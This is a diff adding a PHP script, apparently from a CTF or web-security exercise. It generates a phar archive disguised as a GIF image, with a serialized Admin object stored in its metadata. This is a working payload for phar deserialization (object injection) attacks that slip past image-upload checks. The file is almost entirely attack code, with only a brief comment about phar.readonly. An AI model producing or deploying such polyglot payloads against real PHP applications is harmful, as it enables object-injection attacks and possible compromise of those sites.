@@ -1,0 +1,20 @@
+<?php
+// phar.readonly无法通过该语句进行设置: init_set("phar.readonly",0);
+class User { 
+    public $avatar; 
+    function __construct($path) { 
+        $this->avatar = 'avatar.gif'; 
+    } 
+} 
+class Admin extends User { }
+
+$o = new Admin();
+$filename = 'avatar.phar';
+file_exists($filename) ? unlink($filename) : null;
+$phar=new Phar($filename);
+$phar->startBuffering();
+$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($o);
+$phar->addFromString("foo.txt","bar");
+$phar->stopBuffering();
+?>
